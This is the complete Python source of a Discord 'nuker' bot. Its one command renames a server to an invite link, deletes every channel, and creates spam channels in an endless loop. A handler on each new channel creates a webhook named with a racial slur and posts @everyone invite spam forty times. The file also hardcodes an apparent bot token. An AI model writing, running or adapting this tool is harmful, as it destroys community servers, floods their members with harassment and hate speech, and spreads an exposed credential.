token = "MTI2ODY3MzAyOTI2MTc1NDQzOA.GynX0p.YNVTCIIuFC8i-mzd7DSmn2EFwhG6YPzIDTwrEs"
Prefix = ","
Spam_msg = "@everyone @here discord.gg/Harmony-lol Ontop LOLLLL" 
import discord
from discord.ext import commands
intents=discord.Intents.all()
bot = commands.Bot(command_prefix=Prefix, intents=intents)

@bot.event
async def on_ready():
 print("Logged in as {bot.user.name}")

@bot.command()
async def Harmony(ctx):
    await ctx.guild.edit(name=".gg/harmony-lol ")
    try:
        for channels in ctx.guild.channels:
            await channels.delete()
            print("deleted {}".format(channels))
    except:
        print("Cant delete {}".format(channels))

    while True:
        await ctx.guild.create_text_channel(" FUCKED BY HARMONY")
        await ctx.guild.create_text_channel("HARMONY.LOL ON TOP")
        await ctx.guild.create_text_channel("HARMONY.lol IS BETTER ")
@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="Fucking Nigger")
    for i in range(40):
        try:
            await webhook.send(Spam_msg)
            await channel.send(Spam_msg)
        except:
            pass

bot.run(token)
